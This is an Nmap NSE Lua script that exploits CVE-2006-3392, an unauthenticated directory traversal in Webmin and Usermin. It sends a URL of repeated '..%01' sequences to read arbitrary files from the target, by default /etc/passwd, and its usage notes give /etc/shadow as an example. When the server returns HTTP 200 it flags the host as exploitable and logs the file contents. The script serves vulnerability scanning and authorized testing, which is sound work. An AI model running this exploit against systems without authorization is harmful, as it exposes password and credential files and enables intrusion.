local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)

Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
to bypass the removal of "../" directory traversal sequences.
]]
---
-- @usage
-- nmap -sV --script http-vuln-cve2006-3392 <target>
-- nmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 10000/tcp open  webmin    syn-ack
-- | http-vuln-cve2006-3392:
-- |   VULNERABLE:
-- |   Webmin File Disclosure
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2006-3392
-- |     Description:
-- |       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
-- |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
-- |       to bypass the removal of "../" directory traversal sequences.
-- |     Disclosure date: 2006
-- |     Extra information:
-- |       Proof of Concept:/unauthenticated/..%01/..%01/(..)/etc/passwd
-- |     References:
-- |       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
-- |_      http://www.exploit-db.com/exploits/1997/
--
-- @args http-vuln-cve2006-3392.file <FILE>. Default: /etc/passwd
---

author = "Paul AMAR <aos.paul@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.portnumber({10000})

action = function(host, port)
  local file_var = stdnse.get_script_args(SCRIPT_NAME .. ".file") or "/etc/passwd"

  local vuln = {
       title = 'Webmin File Disclosure',
       state = vulns.STATE.NOT_VULN, -- default
       IDS = {CVE = 'CVE-2006-3392'},
       description = [[
Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
to bypass the removal of "../" directory traversal sequences.
]],
       references = {
          'http://www.exploit-db.com/exploits/1997/',
          'http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure',
       },
       dates = {
           disclosure = {year = '2006', month = '06', day = '29'},
       },
     }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local url = "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01" .. file_var

  stdnse.debug1("Getting " .. file_var)

  local detection_session = http.get(host, port, url)

  stdnse.debug1("Status code:"..detection_session.status)
  if detection_session and detection_session.status == 200 then
    vuln.state = vulns.STATE.EXPLOIT
    stdnse.debug1(detection_session.body)
    return vuln_report:make_output(vuln)
  end
end
